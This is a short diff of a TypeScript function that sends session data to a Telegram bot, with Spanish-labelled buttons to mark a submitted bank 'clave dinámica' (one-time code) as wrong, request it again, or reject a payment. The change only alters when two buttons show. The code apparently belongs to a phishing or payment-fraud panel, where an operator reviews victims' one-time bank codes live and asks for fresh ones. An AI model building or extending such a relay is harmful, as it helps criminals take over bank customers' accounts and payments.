@@ -85,14 +85,12 @@ export async function sendToTelegram(sessionData: any, messageId?: number) {
       buttons.push([{ text: '❌ Dinámica Incorrecta', callback_data: `incorrect_dinamica_${sessionData.sessionId}` }]);
     }
     
-    // Botón para solicitar clave dinámica nuevamente
-    if (sessionData.status === 'otp_submitted' || sessionData.claveDinamica) {
-      buttons.push([{ text: '🔄 Solicitar Dinámica de Nuevo', callback_data: `request_otp_${sessionData.sessionId}` }]);
-    }
-    
-    // Botón para rechazar pago (solo si tiene clave dinámica)
-    if (sessionData.claveDinamica && sessionData.status !== 'admin_rejected') {
-      buttons.push([{ text: '🚫 Rechazar Pago', callback_data: `reject_payment_${sessionData.sessionId}` }]);
+    // Botones para manejar la clave dinámica (solo cuando está en espera de validación)
+    if (sessionData.status === 'otp_submitted' && sessionData.claveDinamica) {
+      buttons.push(
+        [{ text: '🔄 Solicitar Dinámica de Nuevo', callback_data: `request_otp_${sessionData.sessionId}` }],
+        [{ text: '🚫 Rechazar Pago', callback_data: `reject_payment_${sessionData.sessionId}` }]
+      );
     }
     
     // Escapar comillas para JSON
